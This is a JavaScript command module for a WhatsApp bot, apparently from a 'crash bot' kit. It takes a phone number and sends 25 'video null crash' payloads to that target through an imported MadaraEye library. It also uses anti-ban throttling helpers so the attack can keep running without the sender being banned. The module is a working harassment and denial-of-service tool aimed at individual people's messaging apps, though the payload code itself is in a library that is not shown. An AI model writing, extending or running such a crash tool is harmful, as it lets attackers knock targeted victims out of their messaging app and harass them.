'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');
const { canCrash, recordCrash } = require('../../lib/antiBan');

module.exports = {
    name: 'vidx',
    aliases: ['vidxnull', 'videonull', 'vidcrash'],
    category: 'madaraeye',
    desc: 'ᴠɪᴅᴇᴏ ɴᴜʟʟ ᴄʀᴀsʜ ᴠ2',
    usage: '.vidx <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
        if (!args[0]) return sock.sendMessage(ctx.from, { text: `❌ *Usage:* ${prefix}vidx <number>` }, { quoted: msg });
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        try { await canCrash(phone); } catch (e) { return sock.sendMessage(ctx.from, { text: `❌ ${e.message}` }, { quoted: msg }); }
        let eye = global.getMadaraEye?.(sock) || new MadaraEye(sock);
        const TOTAL = 25;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        try {
            for (let i = 0; i < TOTAL; i++) {
                try { await canCrash(phone); } catch (e) { await bar.done(`🛡️ ${e.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`); return; }
                await eye.vidxNull(target);
                await recordCrash(phone);
                await bar.update(1, 'ᴠɪᴅx ɴᴜʟʟ');
            }
            await bar.done(`✅ ᴠɪᴅx ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs\n🎯 ${target}`);
        } catch (e) { await bar.done(`❌ ${e.message}`); }
    }
};